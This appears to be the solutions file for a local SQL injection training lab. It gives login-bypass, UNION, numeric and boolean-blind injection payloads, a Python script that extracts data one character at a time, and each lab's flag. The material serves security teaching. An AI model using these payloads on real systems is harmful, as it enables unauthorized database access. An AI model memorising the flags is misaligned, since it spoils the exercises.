# Solutions

Payloads and flags for every lab, for verification/reference. If you're
here to practice, maybe try the labs first — the in-app hints (Show
hint button on each lab card) are designed to get you there without
spoiling it outright.

---

## Lab 1: SQL Injection — Broken Login

**Vulnerability:** Classic authentication bypass via string-based SQL
injection. User input is concatenated directly into the query with no
sanitization.

**Payload:**
```
Username: admin' --
Password: (anything)
```

Alternative that doesn't rely on knowing the username `admin` exists:
```
Username: ' OR '1'='1' --
Password: (anything)
```

**Flag:** `FLAG{sql1_1nj3ct10n_byp4ss3d}`

**Why it works:** the query becomes
`SELECT ... WHERE username = 'admin' --' AND password = '...'` — the
`--` comments out the rest of the line, including the password check
entirely.

---

## Lab 2: SQL Injection — Product Search (UNION-based)

**Vulnerability:** UNION-based SQL injection in a search parameter,
used to read data from an unrelated table.

**Payloads, in order:**

1. Confirm the injection:
   ```
   electronics'
   ```
2. Find the column count:
   ```
   electronics' ORDER BY 1--
   electronics' ORDER BY 2--
   electronics' ORDER BY 3--   <- this one errors, confirming 2 columns
   ```
3. Enumerate tables (don't need to be told "secrets" exists):
   ```
   electronics' UNION SELECT name, 1 FROM sqlite_master WHERE type='table'--
   ```
4. Extract the flag:
   ```
   electronics' UNION SELECT secret_value, 1 FROM secrets--
   ```

**Flag:** `FLAG{un10n_s3l3ct_f7w}`

---

## Lab 3: SQL Injection — Product Details (Numeric Context)

**Vulnerability:** Same root cause as the other two, but the injection
point is a numeric parameter with no surrounding quotes — a single
quote does nothing useful here.

**Payloads, in order:**

1. Confirm normal behavior:
   ```
   ?id=1
   ```
2. Confirm input is evaluated, not just matched:
   ```
   ?id=1+1        <- should return product ID 2
   ```
3. Find the column count:
   ```
   ?id=1 ORDER BY 1--
   ?id=1 ORDER BY 2--
   ?id=1 ORDER BY 3--
   ?id=1 ORDER BY 4--   <- this one errors, confirming 3 columns
   ```
4. Enumerate tables:
   ```
   ?id=0 UNION SELECT 1,name,1 FROM sqlite_master WHERE type='table'--
   ```
5. Extract the flag:
   ```
   ?id=0 UNION SELECT 1,secret_value,1 FROM secrets--
   ```

**Flag:** `FLAG{numer1c_c0ntext_1nj3ct10n}`

---

## Lab 4: SQL Injection — User Lookup (Blind, Boolean-based)

**Vulnerability:** Boolean-based blind SQL injection. No data or errors
are ever returned — only a true/false signal ("exists" / "not found").
Data must be extracted one character at a time by injecting conditions
that change the boolean outcome.

**Why it's different from the previous labs:**
UNION SELECT is useless here — there's no data channel to dump into.
Instead, you inject subquery conditions that ask yes/no questions about
the data you want, and read the answer from whether the page says
"exists" or "not found."

**Payloads, in order:**

1. Confirm a valid user exists:

?username=alice


2. Confirm the injection point — inject a true condition:

?username=alice' AND '1'='1'--

   Should return "exists" (true condition, query still valid).

3. Inject a false condition to confirm boolean control:

?username=alice' AND '1'='2'--

   Should return "not found" (false condition overrides the match).

4. Confirm you can reach the secrets table:

?username=alice' AND (SELECT COUNT(*) FROM secrets)>0 AND '1'='1'--

   Returns "exists" if the secrets table has at least one row.

5. Extract the flag length first (helps scope your loop):

?username=alice' AND (SELECT LENGTH(secret_value) FROM secrets)=34 AND '1'='1'--

   Increment the number until it returns "exists" — that's the flag length.

6. Extract flag character by character:

?username=alice' AND SUBSTR((SELECT secret_value FROM secrets),1,1)='F' AND '1'='1'--
?username=alice' AND SUBSTR((SELECT secret_value FROM secrets),2,1)='L' AND '1'='1'--
?username=alice' AND SUBSTR((SELECT secret_value FROM secrets),3,1)='A' AND '1'='1'--

   Keep incrementing the position index until you've extracted all characters.

7. Automate it with a Python script (recommended — 34 characters
   manually is tedious):
```python
   import requests

   URL = "http://localhost:PORT/"
   CHARS = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{}_!"
   flag = ""

   for i in range(1, 50):
       for c in CHARS:
           payload = f"alice' AND SUBSTR((SELECT secret_value FROM secrets),{i},1)='{c}' AND '1'='1'--"
           r = requests.get(URL, params={"username": payload})
           if "User exists" in r.text:
               flag += c
               print(f"[+] Found char {i}: {c} → {flag}")
               break
       else:
           print(f"[*] Done at position {i}")
           break

   print(f"\n[+] Flag: {flag}")
```
   Replace `PORT` with the actual port shown after clicking Launch lab.

**Flag:** `FLAG{bl1nd_sqli_0ne_b1t_4t_4_t1me}`

**Why it works:** SQLite's `SUBSTR(string, start, length)` lets you
extract one character at a time. By injecting it as a condition inside
the WHERE clause, the page's boolean response ("exists"/"not found")
becomes a data oracle — leaking one bit of information per request.

## Notes for anyone grading/reviewing this

All three labs share the same root cause — raw string concatenation of
user input into a SQL query, instead of parameterized queries — but
each requires a different first move to detect and exploit:

| Lab | Injection context | First move |
|---|---|---|
| Broken Login | String, auth check | Break out with `'`, comment rest with `--` |
| Product Search | String, SELECT | Break out with `'`, then UNION |
| Product Details | Numeric, SELECT | No quotes needed — confirm via arithmetic, then UNION |

Each lab's actual vulnerable line is marked `!!! VULNERABLE LINE !!!`
in its `app.py`, with a comment explaining the fix ('parameterized
queries') directly above it.
